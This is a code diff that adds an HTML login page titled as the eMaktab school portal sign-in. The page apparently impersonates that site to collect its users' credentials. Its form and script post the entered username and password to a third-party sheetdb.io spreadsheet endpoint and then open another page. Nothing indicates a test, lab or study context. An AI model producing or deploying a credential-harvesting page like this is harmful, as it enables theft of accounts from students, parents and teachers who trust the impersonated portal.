@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>eMaktab| eMaktabga kirish</title>
+    <style>
+      body {
+        font-family: "Open Sans", sans-serif;
+        background-color: #f4f4f4;
+      }
+
+      .container {
+        width: 300px;
+        margin: 0 auto;
+        margin-top: 100px;
+        padding: 20px;
+        background-color: #fff;
+        border-radius: 5px;
+        box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+      }
+
+      h2 {
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      .form-group {
+        margin-bottom: 20px;
+      }
+
+      .form-group label {
+        display: block;
+        font-weight: bold;
+        margin-bottom: 5px;
+      }
+
+      .form-group input {
+        width: 100%;
+        padding: 8px;
+        border-radius: 3px;
+        border: 1px solid #ccc;
+      }
+
+      .form-group input[type="submit"] {
+        background-color: #4caf50;
+        color: #fff;
+        cursor: pointer;
+      }
+      .form-group .eye {
+        width: 15px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <center>
+        <img src="./img/logo bg.png" alt="" />
+      </center>
+      <form
+        form
+        action="https://sheetdb.io/api/v1/ux5xt1hutm5y5"
+        method="post"
+        id="sheetdb-form"
+      >
+        <h2>Login</h2>
+        <div class="form-group">
+          <label for="email">Login</label>
+          <input
+            type="text"
+            id="username"
+            placeholder="Enter your username"
+            name="data[email]"
+            required
+          />
+        </div>
+        <div class="form-group">
+          <label for="psw">Password</label>
+          <input
+            type="password"
+            id="password"
+            placeholder="Enter your password"
+            name="data[psw]"
+            required
+          />
+          <img class="eye" src="./img/eye.png" alt="" />
+        </div>
+        <div class="form-group">
+          <input type="submit" value="Login" />
+        </div>
+      </form>
+    </div>
+
+    <script>
+      var form = document.getElementById("sheetdb-form");
+      let eyeicon = document.querySelector(".eye");
+      let password = document.querySelector("#password");
+
+      eyeicon.onclick = function () {
+        if (password.type == password) {
+          password.type = "text";
+        } else {
+          password.type = "password";
+        }
+      };
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        fetch(form.action, {
+          method: "POST",
+          body: new FormData(document.getElementById("sheetdb-form")),
+        })
+          .then((response) => response.json())
+          .then((html) => {
+            // you can put any JS code here
+            window.open("index2.html", "_blank");
+          });
+      });
+    </script>
+  </body>
+</html>
